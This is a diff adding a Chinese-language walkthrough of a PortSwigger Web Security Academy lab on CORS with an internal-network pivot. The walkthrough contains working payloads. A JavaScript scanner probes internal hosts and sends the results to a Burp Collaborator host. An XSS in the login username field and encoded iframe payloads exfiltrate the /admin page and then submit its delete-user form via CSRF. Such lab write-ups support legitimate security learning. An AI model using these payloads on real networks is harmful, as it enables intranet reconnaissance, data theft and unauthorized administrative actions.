@@ -133,3 +133,118 @@ location='https://b6inmflbyq9n6ibgqp4fa4s8wz2pqe.burpcollaborator.net?key='+this
 
 #### 4. CORS vulnerability with internal network pivot attack
 
+这道题目对所有内网都不设防，使用CORS删除Carlos就可以通过。
+
+* 第一步，先扫描主机。
+
+    ```html
+    <script>
+        let base_url = "http://192.168.0.";
+        let port = ":8080";
+        let base_col_url = "http://vhg7pkizeo6n7rnr7j735jmjlar2fr.burpcollaborator.net/";
+        function request(url) {
+            var xhr = new XMLHttpRequest();
+        	xhr.open("GET", url, true);
+        	xhr.send();
+        	xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    send_col("url=" + encodeURIComponent(url) + "&data=" + encodeURIComponent(xhr.responceText) + "&status=" + xhr.status);
+                }
+            }
+        }
+        function send_col(text) {
+            var collaborator = new XMLHttpRequest();
+            var col_url = base_col_url + "?" + text;
+            collaborator.open("GET", col_url, true);
+            collaborator.send();
+        }
+        for (var i = 0; i <= 255; i++) {
+            request(base_url + i + port);
+        }
+    </script>
+    ```
+
+    这一次我测出来是`192.168.0.90:8080`。
+
+* 找到XSS的注入点，并利用起来。
+
+    * 注入点在login的username的位置：
+
+        `https://ac841fae1e6514fe809549e90082000b.web-security-academy.net/login?username=%22%3E%3Cimg%20src=%22as%22%20onerror=%22alert(1)%22%3E`
+
+    * 这里看了官方的payload才知道要进入`/admin`去删除账号。
+
+        先去看看`/admin`里面有什么东西，发现不给进入。
+
+        这里先构造进入`/admin`的代码。
+
+        ```html
+        <iframe src="/admin" onload="var xhr = new XMLHttpRequest();
+        		var url = 'http://3rveoigls8p7z5dkz2zpa7p49vfl3a.burpcollaborator.net?' + encodeURIComponent(this.contentWindow.document.body.innerHTML);
+            	xhr.open('GET', url, true);
+            	xhr.send();">
+        </iframe>
+        ```
+
+        然后进行url-encode，并构造进入代码。
+
+        这里如果要进行测试，因为`https`和`http`必须要统一，所以上面的burp collaborator的地址得用`https`，不然发不出去。
+
+        ```html
+        <script>
+        location = 'http://192.168.0.90:8080/login?username=">%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%2f%61%64%6d%69%6e%22%20%6f%6e%6c%6f%61%64%3d%22%76%61%72%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%09%09%76%61%72%20%75%72%6c%20%3d%20%27%68%74%74%70%3a%2f%2f%33%72%76%65%6f%69%67%6c%73%38%70%37%7a%35%64%6b%7a%32%7a%70%61%37%70%34%39%76%66%6c%33%61%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%27%20%2b%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%74%68%69%73%2e%63%6f%6e%74%65%6e%74%57%69%6e%64%6f%77%2e%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%29%3b%0a%20%20%20%20%09%78%68%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%20%75%72%6c%2c%20%74%72%75%65%29%3b%0a%20%20%20%20%09%78%68%72%2e%73%65%6e%64%28%29%3b%22%3e%0a%3c%2f%69%66%72%61%6d%65%3e'
+        </script>
+        ```
+
+        得到了网页：
+
+        ```html
+        <script src="/resources/js/labHeader.js"></script>
+        HSCFiSYNxuGCXRwM3xvJQujhrlViZHGxu
+        <div theme="">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href="/">Home</a><p>|</p>
+                            <a href="/admin">Admin panel</a><p>|</p>
+                            <a href="/my-account?id=administrator">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
+                        <input required="" type="hidden" name="csrf" value="sLg91YeOF230NqHQ0G1Jp2Pe2yT6juAO">
+                        <label>Username</label>
+                        <input required="" type="text" name="username">
+                        <button class="button" type="submit">Delete user</button>
+                    </form>
+                </div>
+            </section>
+        </div>
+        ```
+
+* 接下来就是构造删除账号的XSS代码了。这里用CSRF来搞定。
+
+    ```html
+    <iframe src="/admin" onload="var x = this.contentWindow.document.forms[0]; x.username.value='carlos'; x.submit();">
+    </iframe>
+    ```
+
+    这里的Carlos不是题目上说的那样，而是全小写。
+
+    ```html
+    <script>
+    location = 'http://192.168.0.90:8080/login?username=">%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%2f%61%64%6d%69%6e%22%20%6f%6e%6c%6f%61%64%3d%22%76%61%72%20%78%20%3d%20%74%68%69%73%2e%63%6f%6e%74%65%6e%74%57%69%6e%64%6f%77%2e%64%6f%63%75%6d%65%6e%74%2e%66%6f%72%6d%73%5b%30%5d%3b%20%78%2e%75%73%65%72%6e%61%6d%65%2e%76%61%6c%75%65%3d%27%63%61%72%6c%6f%73%27%3b%20%78%2e%73%75%62%6d%69%74%28%29%3b%22%3e%0a%3c%2f%69%66%72%61%6d%65%3e'
+    </script>
+    ```
+
+    我一开始用的：
+
+    ```html
+    <iframe src="/admin?username=carlos" onload="this.contentWindow.document.forms[0].submit();">
+    </iframe>
+    ```
+
+    可能这样没法把carlos赋值给username吧。
+
